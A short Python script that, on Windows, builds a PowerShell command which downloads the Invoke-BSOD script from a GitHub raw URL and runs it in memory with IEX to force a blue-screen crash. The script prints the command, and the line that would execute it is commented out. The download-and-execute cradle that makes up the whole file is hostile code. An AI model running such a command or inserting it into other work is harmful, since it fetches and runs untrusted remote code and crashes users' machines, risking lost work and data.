import subprocess
import os

def run():
    if os.name == "nt":
        powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
        print(powershell_command)
        #result = subprocess.run(powershell_command)